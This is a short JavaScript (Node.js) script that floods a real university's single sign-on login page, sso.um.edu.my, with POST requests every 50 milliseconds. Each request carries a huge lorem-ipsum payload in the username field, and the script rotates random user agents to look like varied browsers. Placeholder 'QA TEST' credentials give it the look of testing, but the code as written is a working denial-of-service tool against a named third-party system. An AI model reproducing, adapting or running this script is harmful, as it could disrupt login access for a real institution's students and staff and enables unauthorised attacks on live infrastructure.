const qs = require('qs');
const axios = require('axios');
const { LoremIpsum } = require('lorem-ipsum');
const randomUseragent = require('random-useragent');
const a = randomUseragent.getRandom(); // gets a random user agent string
const lorem = new LoremIpsum({

    sentencesPerParagraph: {
        max: 8,
        min: 4
    },
    wordsPerSentence: {
        max: 16,
        min: 4
    }
});




let config = (u) => ({
    method: 'post',
    maxBodyLength: Infinity,
    url: 'https://sso.um.edu.my/cas/loginAllType?service=https://mysis.um.edu.my/ctes/landing',
    headers: {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language': 'en-GB,en;q=0.9',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'JSESSIONID=79D714ADD69277427376BB961005F4A8',
        'Origin': 'https://sso.um.edu.my',
        'Referer': 'https://sso.um.edu.my/cas/loginAllType?service=https%3A%2F%2Fmysis.um.edu.my%2Fctes%2Flanding',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-User': '?1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': randomUseragent.getRandom(),
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"'
    },
    data: qs.stringify({
        'uname': u,
        'password': 'QA TEST',
        'domain': '@um.edu.my',
        '_eventId': 'submit',
        'username': 'QATESTING@um.edu.my'
    })
})

setInterval(() => {
    axios.request(config(lorem.generateParagraphs(200)))
        .then((response) => {
            console.count(response.status);
        })
        .catch((error) => {
            console.log(error);
        });

}, 50);